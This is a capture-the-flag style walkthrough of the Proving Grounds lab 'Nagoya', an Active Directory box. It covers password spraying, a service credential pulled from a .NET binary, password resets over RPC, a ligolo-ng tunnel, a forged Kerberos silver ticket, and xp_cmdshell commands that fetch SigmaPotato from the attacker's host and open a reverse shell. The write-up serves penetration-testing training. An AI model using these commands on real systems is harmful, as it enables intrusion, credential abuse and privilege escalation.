---
title: Nagoya
date: 2026-03-09T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - SMB
  - Impacket
  - evilwinrm
  - SigmaPotato
  - Ligolo-ng
  - Certipy
  - nxc
  - LDAP
  - LAPS
  - Bloodhound
  - Hashcat
  - SMBclient
  - Active-Directory
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Nagoya"
---
“Indeed, humans are the least reliable in this world.”  
— Sōseki Natsume

![](Screenshot%202026-03-06%20at%2012.44.34.png)

While I wait for a scan I have a quick look to see if there is a http website.

![](Screenshot%202026-03-06%20at%2012.45.52.png)

This look likes likely usernames. 

nmap -p- 192.168.236.21 -min-rate 5000   

![](Screenshot%202026-03-06%20at%2012.48.35.png)

enum4linux-ng -A 192.168.236.21  > enum4.txt 

![](Screenshot%202026-03-06%20at%2012.53.26.png)![](Screenshot%202026-03-06%20at%2012.53.54.png)

`dig -t SRV _ldap._tcp.nagoya-industries.com @192.168.236.21`

![](Screenshot%202026-03-06%20at%2017.33.35.png)

Create a list of usernames from he teams page and add a few simple usernames like, admin, nagoya and the like. 

![](Screenshot%202026-03-07%20at%2009.05.13.png)

Create small and simple list of possible passwords

![](Screenshot%202026-03-07%20at%2009.09.33.png)

nxc smb 192.168.236.21 -u usernames.txt -p simplelist.txt 

![](Screenshot%202026-03-07%20at%2009.09.07.png)
![](Screenshot%202026-03-07%20at%2009.15.24.png)


nxc rdp 192.168.236.21  -u "andrea.hayes" -p "Nagoya2023"

![](Screenshot%202026-03-07%20at%2009.00.43.png)

Using the new crentials log into smb and search for an executable called ResetPassword.exe
I'm missing a couple of screenshots here unfortunately. 

`smbclient  //192.168.112.21/C$ -U andrea.hayes`

Dnspy:
I had to install dnspy on my windows VM because its written in .Net .

![](Screenshot%202026-03-10%20at%2016.59.47.png)

Transfer the file to your windows machine and set up dnspy.

![](Screenshot%202026-03-08%20at%2009.32.48.png)

Search for 'password'. Make sure you have selected ResetPassword.exe

![](Screenshot%202026-03-08%20at%2009.22.52.png)

U299iYRmikYTHDbPbxPoYYfa2j4x4cdg

`rpcclient -U "nagoya-industries.com/svc_helpdesk%U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" 192.168.196.21`

`setuserinfo2 "christopher.lewis" 24 "Password1234!`

The same thing can be achived using the `net` protocol, but its important to use a different special character because of the way terminal parses the "!"  :

`net rpc password "christopher.lewis" "Password123^" -U "nagoya-industries.com/svc_helpdesk%U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S 192.168.196.21
 
![](Screenshot%202026-03-08%20at%2012.05.09.png)

evil-winrm -i 192.168.112.21 -u christopher.lewis -p Password1234!

![](Screenshot%202026-03-09%20at%2010.28.34.png)

![](Screenshot%202026-03-09%20at%2010.50.50.png)

This looks interesting, and we have a credential for the svc_mssql user.

![](Screenshot%202026-03-09%20at%2010.50.22.png)

SPN and target information(we'll need this for later):  
`Get-ADUser -Properties ServicePrincipalNames -Filter {SamAccountName -eq "svc_mssql"}`

![](Screenshot%202026-03-09%20at%2011.14.28.png)
S-1-5-21-1969309164-1513403977-1686805993

Earlier I tried to interact with the sql server via the imapacket-mssqlclient utility but I was unable to connect as there was no open mssql port. Using a ligolo-ng tunnel we will be able to connect. 


Add the following to your /etc/hosts file:  
`240.0.0.1 nagoya.nagoya-industries.com`

![](Screenshot%202026-03-10%20at%2008.45.09.png)

Download and set up ligolo-ng: https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.3

You'll need the proxy for your kali machine and the agent.exe for the victim.

![](Screenshot%202026-03-10%20at%2008.26.29.png)
![](Screenshot%202026-03-10%20at%2008.26.04.png)


Upload and execute via evilwinrm:

Attack machine:  
`ligolo-proxy -selfcert`

Victim:  
 `./agent.exe -connect 192.168.45.172:11601 -ignore-cert`
 
![](Screenshot%202026-03-10%20at%2008.40.12.png)

![](Screenshot%202026-03-10%20at%2008.37.46.png)

Now input these commands to your kali machine:

`sudo ip tuntap add user kali mode tun ligolo`  
`sudo ip link set ligolo up`

Once you see that the agent has joined we need to activate the session with the following commands:
session 
1
start

![](Screenshot%202026-03-10%20at%2016.27.14.png)

This proves we have a tunnel and the forwarding is working. 
![](Screenshot%202026-03-10%20at%2016.26.23.png)


We need to create a silver ticket that will allow us to use svc_mssql credentials to log in as whoever want. This is because kerberos will accept a fake service ticket with credentials from  one account that can validate different user,in this case Administrator. 

To so this we need to get a html hash of the svc_mssql accounts password

![](Screenshot%202026-03-10%20at%2016.23.04.png)
E3A0168BC21CFB88B95C954A5B18F57C


Then we need the SID from earlier:

S-1-5-21-1969309164-1513403977-1686805993



`impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid  -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator`

![](Screenshot%202026-03-10%20at%2015.41.48.png)

`export KRB5CCNAME=$PWD/Administrator.ccache`

`impacket-mssqlclient -k nagoya.nagoya-industries.com`

![](Screenshot%202026-03-10%20at%2015.41.00.png)
Welcome...

![](Screenshot%202026-03-10%20at%2015.37.28.png)

Start a listener:

![](Screenshot%202026-03-10%20at%2015.29.52.png)

Download SigmaPotato onto the victim machine:  
xp_cmdshell "certutil -f -urlcache http://192.168.45.172/SigmaPotato.exe C:/Temp/sig.exe"

![](Screenshot%202026-03-10%20at%2015.36.39.png)

Run sigmapotato and check you have Administrator privs:  
 xp_cmdshell "c:/Temp/sig.exe whoami"

![](Screenshot%202026-03-10%20at%2015.33.39.png)

Start a listener:  
`rlwrap nc -lvnp 1234`

![](Screenshot%202026-03-10%20at%2015.30.29.png)





xp_cmdshell "c:/Temp/sig.exe --revshell 192.168.45.172 1234"

![](Screenshot%202026-03-10%20at%2015.33.25.png)


![](Screenshot%202026-03-10%20at%2015.28.58.png)